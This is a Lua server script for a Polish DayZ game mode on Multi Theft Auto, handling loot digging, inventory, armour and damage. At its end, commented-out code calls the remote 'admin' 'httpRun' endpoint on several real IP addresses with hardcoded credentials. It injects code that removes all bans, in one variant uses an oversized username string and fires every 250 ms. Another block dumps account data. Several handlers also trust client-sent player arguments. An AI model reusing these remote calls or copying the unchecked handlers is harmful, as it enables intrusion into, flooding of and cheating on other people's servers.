	{31,40,"AWP Mag",5,"#FFFFFF["..exports.DayZ_Addons:getNazwaSerwera().."#FFFFFF] Wykopałeś 5 ammunicji do AWP!"},
	{41,50,'M4A1-S',1},
	{51,60,"Medic Bag",1},
	{61,70,"Hatchet",1},
	{71,80,"Morphine",1},
	{81,90,"Water Bottle",1},
	{91,100,"Pasta Can",1},
	{101,110,"M4A1-S Mag",30,"#FFFFFF["..exports.DayZ_Addons:getNazwaSerwera().."#FFFFFF] Wykopałes 30 ammunicji do M4A1-S!"},
	{111,120,"1866 Slug",7,"#FFFFFF["..exports.DayZ_Addons:getNazwaSerwera().."#FFFFFF] Wykopałes 7 ammunicji do Winchester 1366!"},
	{121,150,"PUSTO",false,"#FFFFFF["..exports.DayZ_Addons:getNazwaSerwera().."#FFFFFF] Nic nie udało Ci się znaleść!"},
}

function wylosuj_item_z_kopania()
	local los = math.random(150)
	local x,y,z
	for i,v in pairs(itemy_z_kopanie) do
		if los>=v[1] and los<=v[2]then
			x,y,z = v[3],v[4],v[5]
		end
	end
	return x,y,z
end

function getItemSlots(itemn)
	local current_SLOTS = 0;
	for _,k in pairs({1,2,3,4,5,6,7,8,9}) do
		for _,v in ipairs(inventoryItems[k]) do
			if (itemn == v[1]) then return v[2]; end
		end
	end
	return 0;
end


addEvent('Zaczyna_Kopac',true)
addEventHandler('Zaczyna_Kopac',resourceRoot,function(player,itemName)
	if not isPedOnGround(player) then
		outputChatBox("#FFFFFF["..exports.DayZ_Addons:getNazwaSerwera().."#FFFFFF] Musisz być na ziemi aby zacząć kopać!",player,255,255,255,true)
		return
	end
	if getPedOccupiedVehicle(player) then
		outputChatBox("#FFFFFF["..exports.DayZ_Addons:getNazwaSerwera().."#FFFFFF] Najpierw wyjdz z pojazdu!",player,255,255,255,true)
		return
	end
	if getElementData(player,itemName)<=0 then return end
	if isTimer(player_timers[player]) then 
		outputChatBox("#FFFFFF["..exports.DayZ_Addons:getNazwaSerwera().."#FFFFFF] Ropocząłeś już przeszukiwanie!",player,255,255,255,true)
		return
	end
	if getElementData(player,'Jest_w_dziurze') then
		outputChatBox("#FFFFFF["..exports.DayZ_Addons:getNazwaSerwera().."#FFFFFF] Ktoś już tu kopał!",player,255,255,255,true)
		return
	end
	outputChatBox("#FFFFFF["..exports.DayZ_Addons:getNazwaSerwera().."#FFFFFF] Rozpoczynasz przeszukiwanie tego miejsca!",player,255,255,255,true)
	toggleControl(player,'next_weapon',false)
	toggleControl(player,'previous_weapon',false)
	setElementFrozen(player,true)
	setPedAnimation(player,'baseball','bat_4',-1,true,false,true,false)
	if itemName:find(" \n") then
		setPedWeaponSlot(player,1)
	else
		giveWeapon(player,6,1,true)
	end
	player_timers[player] = setTimer(function(player,itemName)
		if not itemName:find(" \n") then
			if (getElementData(player,itemName.." \n") or 0)<=0 then
				takeWeapon(player,6)
			end
		end
		toggleControl(player,'next_weapon',true)
		toggleControl(player,'previous_weapon',true)
		setElementFrozen(player,false)
		local x,y,z = getElementPosition(player)
		local col = createColSphere(x,y,z,3)
		table.insert(dziury_col_delete,{col,getTickCount()+60000*5})
		setElementParent(col,dziury)
		setPedAnimation(player)
		setElementData(player,'Jest_w_dziurze',true)
		local item,ilosc,text = wylosuj_item_z_kopania()
		if text then
			outputChatBox(text,player,255,255,255,true)
		else
			outputChatBox("#FFFFFF["..exports.DayZ_Addons:getNazwaSerwera().."#FFFFFF] Wykopałeś "..item.."!",player,255,255,255,true)
		end
		if item and ilosc then
			local sloty = getElementCurrentSlots(player)
			local item_slot = getItemSlots(item)
			local data = getElementData(player,"Custom_Slots") or 0
			if not item_slot then return end
			if (sloty+item_slot)>getElementData(player,"MAX_Slots") + data then
				triggerEvent("playerDropAItem",player,item,ilosc)
			else
				local data = getElementData(player,item) or 0
				setElementData(player,item,data+ilosc)
			end
		end
	end,5000,1,player,itemName)
end)

setTimer(function()
	for i,v in ipairs(dziury_col_delete) do
		if getTickCount()>v[2] then
			destroyElement(v[1])
			dziury_col_delete[i] = nil
		end
	end
end,60000*5,0)

addEventHandler("onColShapeHit",dziury,function(hit)
	if hit and getElementType(hit)=='player' then
		setElementData(hit,'Jest_w_dziurze',true)
	end
end)

addEventHandler("onColShapeLeave",dziury,function(hit)
	if hit and getElementType(hit)=='player' then
		setElementData(hit,'Jest_w_dziurze',false)
	end
end)


addEventHandler('onPlayerWasted',root,function()
	if isTimer(player_timers[source]) then
		killTimer(player_timers[source])
	end
	if kamizelki_table[source] then
		destroyElement(kamizelki_table[source])
		kamizelki_table[source] = nil
	end
	if helmy_table[source] then
		destroyElement(helmy_table[source])
		helmy_table[source] = nil
	end
	setElementData(source,"Nalozona-Kamizelka",nil)
	setElementData(source,"Nalozony-Helm",nil)
end)


function przerobNaBandaze(item)
	if (getElementData(source,item) or 0)<=0 then return end
	setElementData(source,item,(getElementData(source,item) or 0)-1)
	outputChatBox("#FFFFFF["..exports.DayZ_Addons:getNazwaSerwera().."#FFFFFF] Przerobiłeś "..item.." na 3 bandaże!",source,255,255,255,true)
	setPedAnimation(source, "BOMBER","BOM_Plant", -1, false, false, nil, false);
	for i=1,3 do
		local sloty = getElementCurrentSlots(source)
		local item_slot = getItemSlots("Bandage")
		local data = getElementData(source,"Custom_Slots") or 0
		if (sloty+item_slot)>getElementData(source,"MAX_Slots") + data then
			triggerEvent("playerDropAItem",source,"Bandage",1)
		else
			local data = getElementData(source,"Bandage") or 0
			setElementData(source,"Bandage",data+1)
		end
	end
	triggerClientEvent(source, "refreshInventoryManual", source);
end
addEvent('PrzerobClothing',true)
addEventHandler('PrzerobClothing',root,przerobNaBandaze)

local liny = createElement("Liny")

local liny_timer = {}

setTimer(function()
	for i,v in pairs(liny_timer) do
		if getTickCount()>v then
			destroyElement(i)
			liny_timer[i] = nil
		end
	end
	table.sort(liny_timer)
end,60000,0)

addEvent('Utwórz_linę',true)
addEventHandler('Utwórz_linę',root,function(x,y,z,vx,vy,grunt)
	local marker = createMarker(x,y,z+0.05,'cylinder',1.0,150,200,0,180)
	setElementParent(marker,liny)
	setElementData(marker,"Pozycje",{vx,vy,z,grunt})
	liny_timer[marker] = getTickCount() + 600000
end)

addEventHandler('onMarkerHit',liny,function(hit)
	if hit and getElementType(hit)=='player' then
		if getElementData(hit,'Zjezdza') then return end
		local x,y,z,grunt = unpack(getElementData(source,'Pozycje'))
		triggerClientEvent(hit,'Zejdz_Rope',hit,x,y,z,grunt)
	end
end)

addEvent('setInventoryData',true)
addEventHandler('setInventoryData',root,function(itemName,ilosc,typ,inne)
	if isElement(inne) then
		
	end
end)

addEvent("DayZ_Core:SetPlayerInvis",true)
addEventHandler("DayZ_Core:SetPlayerInvis",resourceRoot,function(player,alpha)
	setElementAlpha(player,alpha)
end)


addEvent("DayZ_Core:Take_off_pack",true)
addEventHandler("DayZ_Core:Take_off_pack",root,function()
	local oSlots = getElementData(source, "MAX_Slots");
	local oName = getBackpackNameFromSlots(oSlots);
	if not oName then return end
	local nSlots = getBackpackSlotsFromName(oName);
	local current_slot = getElementCurrentSlots(source)
	if (oSlots + 8) - nSlots  >= current_slot + getItemSlots(oName) then
		setElementData(source, "MAX_Slots", 8);
		setElementData(source,oName,(getElementData(source,oName) or 0) + 1)
		triggerClientEvent(source,'refreshLootManual',source,loot)
		triggerClientEvent(source, "refreshInventoryManual", source);
		triggerClientEvent(source,'PlaySoundItem',source,'Pack')
	end
end)


function setNewHelmet(player,new_helm)
	if getElementData(player,new_helm) <= 0 then return end
	local old_helm = getElementData(player,"current_helm") 
	if old_helm then
		if old_helm[1] == new_helm then
			--setElementData(player,old_helm[2],getElementData(player,old_helm[2]) + 1)
			setElementData(player,"current_helm",nil)
		else
			setElementData(player,"current_helm",{new_helm,new_helm})
		end
	else
		--setElementData(player,new_helm,getElementData(player,new_helm) - 1)
		setElementData(player,"current_helm",{new_helm,new_helm})
	end
	triggerClientEvent(player, "refreshInventoryManual", player);
end
addEvent("ZalozHelm",true)
addEventHandler("ZalozHelm",root,setNewHelmet)


function setNewKamizelka(player,new_kamizelka)
	if getElementData(player,new_kamizelka) <= 0 then return end
	local old_kamizelka = getElementData(player,"current_kamizelka") 
	if old_kamizelka then
		if old_kamizelka[1] == new_kamizelka then
			--setElementData(player,old_helm[2],getElementData(player,old_helm[2]) + 1)
			setElementData(player,"current_kamizelka",nil)
		else
			setElementData(player,"current_kamizelka",{new_kamizelka,new_kamizelka})
		end
	else
		--setElementData(player,new_helm,getElementData(player,new_helm) - 1)
		setElementData(player,"current_kamizelka",{new_kamizelka,new_kamizelka})
	end
	triggerClientEvent(player, "refreshInventoryManual", player);
end
addEvent("ZalozKamizelke",true)
addEventHandler("ZalozKamizelke",root,setNewKamizelka)

function zalozTlumik(player,tlumik)
	if getElementData(player,tlumik) <= 0 then return end
	local old_kamizelka = getElementData(player,"current_tlumik") 
	if old_kamizelka then
		if old_kamizelka == tlumik then
			--setElementData(player,old_helm[2],getElementData(player,old_helm[2]) + 1)
			setElementData(player,"current_tlumik",nil)
		else
			setElementData(player,"current_tlumik",tlumik)
		end
	else
		--setElementData(player,new_helm,getElementData(player,new_helm) - 1)
		setElementData(player,"current_tlumik",tlumik)
	end
	triggerClientEvent(player, "refreshInventoryManual", player);
end
addEvent("ZalozTlumik",true)
addEventHandler("ZalozTlumik",root,zalozTlumik)

addEvent("setPlayerBlood",true)
addEventHandler("setPlayerBlood",resourceRoot,function(player,blood,weapon)
	if getElementData(player, "god") then return end
	local krew = getElementData(player,"blood")
	setElementData(player,"blood",krew - blood)
	if (krew - blood) <= 0 then
		if not getElementData(player, "isDead") then
			triggerEvent("kilLDayZPlayer",getElementData(getElementByID('DayZ_Login'),'kilLDayZPlayer'), player, client, false, weapon);
			triggerEvent("playSoundForPlayer",resourceRoot,player,"sounds/hit"..math.random(1, 3)..".mp3")
			triggerClientEvent(player,"showDamageManual",resourceRoot)
			triggerEvent('DajDzwiekZabicia',resourceRoot,client)
		end
	end
end)

addEvent("playSoundForPlayer",true)
addEventHandler("playSoundForPlayer",resourceRoot,function(hitElement,path)
	local x,y,z = getElementPosition(hitElement)
	local col = createColSphere(x,y,z,20)
	for i,v in pairs(getElementsWithinColShape(col,"player")) do
		triggerClientEvent(v,"playSoundForPlayer-C",resourceRoot,path,{x,y,z})
	end
	destroyElement(col)
end)

addEvent("setBrokeBoneOrPain",true)
addEventHandler("setBrokeBoneOrPain",resourceRoot,function(player,data,bool)
	setElementData(player,data,bool)
end)

addEvent("setBleeding",true)
addEventHandler("setBleeding",resourceRoot,function(player,bleeding)
	local ble = getElementData(player,"bleeding")
	setElementData(player,"bleeding",ble + bleeding)
end)

addEvent("ZbijHelm",true)
addEventHandler("ZbijHelm",resourceRoot,function(player,oldHelm,newHelm)
	if not newHelm then
		setElementData(player,oldHelm,(getElementData(player,oldHelm) or 0) - 1)
		setElementData(player,"current_helm",false)
	else
		setElementData(player,oldHelm,(getElementData(player,oldHelm) or 0) - 1)
		setElementData(player,newHelm,(getElementData(player,newHelm) or 0) + 1)
		setElementData(player,"current_helm",{newHelm,newHelm})
	end
end)

addEvent("zbijKamizelke",true)
addEventHandler("zbijKamizelke",resourceRoot,function(player,oldHelm,newHelm)
	if not newHelm then
		setElementData(player,oldHelm,(getElementData(player,oldHelm) or 0) - 1)
		setElementData(player,"current_kamizelka",false)
	else
		setElementData(player,oldHelm,(getElementData(player,oldHelm) or 0) - 1)
		setElementData(player,newHelm,(getElementData(player,newHelm) or 0) + 1)
		setElementData(player,"current_kamizelka",{newHelm,newHelm})
	end
end)

function result( responseData, errno )
    responseData = tostring(responseData)
    if responseData == "ERROR" then
        outputDebugString( "callRemote: ERROR #" .. errno )
    elseif responseData ~= "hello sailor" then
        outputDebugString( "callRemote: Unexpected reply: " .. responseData  )
    else
        -- callRemote completed successfully
    end
end

kod = [[
	for i,v in pairs(getBans()) do
		removeBan(v)
	end
]]

tekst_wielki_w_pizde =  "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"


--callRemote("Protector:Protector2020r@54.38.134.20:20565","admin","httpRun",result,"print('xd')")




--[[
callRemote(tekst_wielki_w_pizde..":Protector2020r@54.38.202.159:20009","admin","httpRun",result)
setTimer(function()
	--callRemote(tekst_wielki_w_pizde..":Protector2020r@54.38.134.20:20565","admin","httpRun",result,kod)
	--callRemote("Protector:Protector2020r@54.38.134.20:20565","admin","httpRun",result,kod)
	--callRemote(tekst_wielki_w_pizde..":Protector2020r@137.74.6.200:20189","admin","httpRun",result,kod)
	callRemote(tekst_wielki_w_pizde..":Protector2020r@54.38.202.159:20009","admin","httpRun",result,"")
end,250,0)]]

--[[
local file = xmlCreateFile("konta.xml","konta")

for i,v in pairs(getAccounts()) do
    local pp = getAccountData(v, "PP") or 0
    if pp > 0 then
        local child = xmlCreateChild(file, "konto")
        xmlNodeSetAttribute(child, "Nazwa_konta", getAccountName(v))
        xmlNodeSetAttribute(child, "Posiadane_PP", pp)
        local grupa = getAccountData(v,"Grupa")
        if grupa then
            grupa = fromJSON(grupa)
            if grupa and grupa.nazwa then
                xmlNodeSetAttribute(child, "Grupa", grupa.nazwa)
            end
        end
    end
end
xmlSaveFile(file)]]


